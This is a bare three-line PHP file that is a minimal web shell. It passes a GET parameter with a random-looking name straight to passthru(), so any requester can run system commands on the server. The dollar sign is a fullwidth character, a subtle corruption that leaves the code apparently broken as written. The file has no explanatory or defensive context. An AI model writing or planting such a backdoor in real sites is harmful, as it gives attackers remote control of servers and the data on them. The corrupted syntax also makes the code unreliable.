<?php
passthru(＄_GET['zSwSzPzf']);
?>
